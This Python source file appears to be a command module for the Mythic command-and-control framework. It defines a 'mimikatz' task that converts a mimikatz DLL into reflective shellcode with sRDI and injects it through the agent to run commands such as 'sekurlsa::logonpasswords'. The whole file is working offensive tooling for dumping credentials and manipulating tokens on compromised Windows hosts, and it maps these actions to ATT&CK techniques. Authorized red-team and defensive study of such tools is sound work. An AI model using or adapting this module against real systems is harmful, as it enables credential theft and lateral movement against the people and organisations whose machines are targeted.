from CommandBase import *
import json
from uuid import uuid4
from sRDI import ShellcodeRDI
from os import path
from MythicFileRPC import *


class MimikatzArguments(TaskArguments):

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "command": CommandParameter(name="Command(s)", type=ParameterType.String, description="Mimikatz command to run (can be one or more).", required=True),
        }

    async def parse_arguments(self):
        if len(self.command_line):
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("command", self.command_line)
            self.add_arg("pipe_name", str(uuid4()))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(MimikatzCommand.help_cmd))


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz [command1] [command2] [...]"
    description = "Execute one or more mimikatz commands (e.g. `mimikatz coffee sekurlsa::logonpasswords`)."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@djhohnstein"
    argument_class = MimikatzArguments
    browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
    attackmapping = ["T1134", "T1098", "T1547", "T1555", "T1003", "T1207", "T1558", "T1552", "T1550"]

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        dllFile = path.join(self.agent_code_path, f"mimikatz_{task.callback.architecture}.dll")
        dllBytes = open(dllFile, 'rb').read()
        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("smb_server_wmain"), task.args.get_arg("pipe_name").encode(), 0)
        file_resp = await MythicFileRPC(task).register_file(converted_dll)
        if file_resp.status == MythicStatus.Success:
            task.args.add_arg("loader_stub_id", file_resp.agent_file_id)
        else:
            raise Exception("Failed to register Mimikatz DLL: " + file_resp.error_message)
        return task

    async def process_response(self, response: AgentResponse):
        pass